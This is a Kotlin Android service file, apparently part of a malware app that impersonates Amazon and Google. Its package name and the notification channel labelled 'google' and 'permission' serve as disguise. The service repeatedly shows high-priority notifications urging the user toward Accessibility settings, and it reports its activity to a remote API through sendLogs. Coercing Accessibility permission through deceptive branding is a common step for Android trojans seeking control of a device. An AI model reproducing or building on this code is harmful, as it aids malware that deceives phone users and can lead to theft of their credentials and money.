package com.amazon.zzz.Services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.os.Build
import android.os.IBinder
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.R
import com.amazon.zzz.Strings.localeTextAccessibility
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm


class srvPushAccessibility : Service() {

    private var mNotificationManager: NotificationManager? = null

    override fun onBind(intent: Intent): IBinder? {
        throw UnsupportedOperationException("")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        apiUt.sendLogs(this, "", "srvPushAccessibility onStartCommand", "log")
        utUtils.Log("srvPushAccessibility", "onStartCommand executed with startId: $startId")
        if (intent != null) {
            runCatching {
                mNotificationManager =
                    this.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

                val contentIntent = PendingIntent.getActivity(
                    this,
                    1234,
                    Intent(this, constNm.a3).putExtra("FromPush", true)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT),
                    PendingIntent.FLAG_CANCEL_CURRENT
                )

                val id = "googles"
                val description = "permission"

                val notificationBuilder = if (Build.VERSION.SDK_INT > 25) {
                    val mChannel =
                        NotificationChannel(id, "google", NotificationManager.IMPORTANCE_HIGH)
                    mChannel.description = description
                    mChannel.enableLights(true)
                    mChannel.lightColor = Color.RED
                    mChannel.enableVibration(true)
                    mChannel.vibrationPattern = longArrayOf(150, 150, 150, 150)
                    // Configure the notification channel.
                    val att = AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                        .build()
                    mChannel.setSound(
                        RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION),
                        att
                    )
                    mChannel.setShowBadge(false)
                    mNotificationManager?.createNotificationChannel(mChannel)

                    Notification.Builder(this, id)
                } else {
                    Notification.Builder(this)
                }

                SharedPreferencess.init(this.applicationContext)
                notificationBuilder
                    .setContentTitle(SharedPreferencess.appName)
                    .setVibrate(longArrayOf(150, 150, 150, 150))
                    .setAutoCancel(true)
                    .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
                    .setDefaults(Notification.DEFAULT_VIBRATE)
                    .setDefaults(Notification.DEFAULT_SOUND)
                    .setDefaults(Notification.DEFAULT_LIGHTS)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .setVisibility(Notification.VISIBILITY_PUBLIC)
                    .setCategory(Notification.CATEGORY_REMINDER)

                val text = localeTextAccessibility() + " " + constNm.access1
                notificationBuilder.setContentText(text)
                runCatching {
                    notificationBuilder.setSmallIcon(R.mipmap.ic_launcher_round)
                }
                runCatching {
                    notificationBuilder.setSmallIcon(R.mipmap.ic_launcher)
                }
                notificationBuilder.setContentIntent(contentIntent)

                val notification = notificationBuilder.build()
                runCatching { mNotificationManager?.cancel(993) }
                runCatching { mNotificationManager?.notify(993, notification) }

                stopSelf()
            }
        } else {
            stopSelf()
        }

        return START_NOT_STICKY
    }

}